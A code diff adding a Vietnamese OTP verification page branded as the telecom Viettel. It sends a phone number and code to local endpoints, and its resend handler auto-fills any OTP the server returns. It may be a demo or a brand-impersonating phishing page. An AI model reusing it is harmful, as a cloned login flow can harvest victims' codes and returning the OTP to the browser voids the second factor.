@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Viettel - Xác thực OTP</title>
+    <link rel="stylesheet" href="/style.css">
+    <style>
+        .otp-input {
+            font-size: 32px;
+            text-align: center;
+            letter-spacing: 10px;
+            padding: 15px;
+            font-weight: bold;
+        }
+        .resend-btn {
+            background: transparent;
+            border: 2px solid var(--viettel-red);
+            color: var(--viettel-red);
+            margin-top: 10px;
+        }
+        .resend-btn:hover {
+            background: var(--viettel-red);
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card" style="max-width:450px;">
+        <div class="logo">
+    <img src="/logo.png" alt="Viettel" class="logo-img">
+    <p>Xác thực mã OTP</p>
+</div>
+            <div class="badge">📨 Mã OTP đã được gửi đến số điện thoại</div>
+            
+            <div style="text-align:center; margin:20px 0;">
+                📱 <strong id="phoneDisplay" style="font-size:20px;"></strong>
+            </div>
+            
+            <div class="form-group">
+                <label>🔑 Nhập mã OTP 6 số</label>
+                <input type="text" id="otp" class="otp-input" placeholder="------" maxlength="6" autocomplete="off">
+            </div>
+            
+            <button id="verifyBtn">✅ Xác nhận OTP</button>
+            <button id="resendBtn" class="resend-btn">🔄 Gửi lại mã OTP</button>
+            
+            <div id="message" class="message"></div>
+            
+            <hr>
+            <div class="footer"><a href="/">◀ Quay lại</a></div>
+        </div>
+    </div>
+
+    <script>
+        const phone = sessionStorage.getItem('verify_phone');
+        if (!phone) window.location.href = '/';
+        document.getElementById('phoneDisplay').innerText = phone;
+        
+        function showMessage(msg, type) {
+            const msgDiv = document.getElementById('message');
+            msgDiv.innerHTML = msg;
+            msgDiv.className = 'message ' + type;
+            msgDiv.style.display = 'block';
+            setTimeout(() => msgDiv.style.display = 'none', 5000);
+        }
+        
+        document.getElementById('verifyBtn').addEventListener('click', async () => {
+            const otp = document.getElementById('otp').value;
+            const btn = document.getElementById('verifyBtn');
+            
+            if (!otp || otp.length !== 6) {
+                showMessage('❌ Vui lòng nhập đủ 6 số OTP', 'error');
+                return;
+            }
+            
+            btn.disabled = true;
+            btn.innerHTML = '⏳ Đang xác thực...';
+            
+            try {
+                const res = await fetch('/api/verify', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, otp })
+                });
+                const result = await res.json();
+                
+                if (result.success) {
+                    showMessage('✅ ' + result.message, 'success');
+                    setTimeout(() => window.location.href = '/success.html', 1500);
+                } else {
+                    showMessage('❌ ' + result.message, 'error');
+                    btn.disabled = false;
+                    btn.innerHTML = '✅ Xác nhận OTP';
+                }
+            } catch (error) {
+                showMessage('❌ Lỗi: ' + error.message, 'error');
+                btn.disabled = false;
+                btn.innerHTML = '✅ Xác nhận OTP';
+            }
+        });
+        
+        document.getElementById('resendBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('resendBtn');
+            btn.disabled = true;
+            btn.innerHTML = '⏳ Đang gửi lại...';
+            
+            try {
+                const res = await fetch('/api/resend-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone })
+                });
+                const result = await res.json();
+                showMessage('ℹ️ ' + result.message, 'success');
+                if (result.otp) document.getElementById('otp').value = result.otp;
+                btn.disabled = false;
+                btn.innerHTML = '🔄 Gửi lại mã OTP';
+            } catch (error) {
+                showMessage('❌ Lỗi: ' + error.message, 'error');
+                btn.disabled = false;
+                btn.innerHTML = '🔄 Gửi lại mã OTP';
+            }
+        });
+        
+        document.getElementById('otp').focus();
+    </script>
+</body>
+</html>
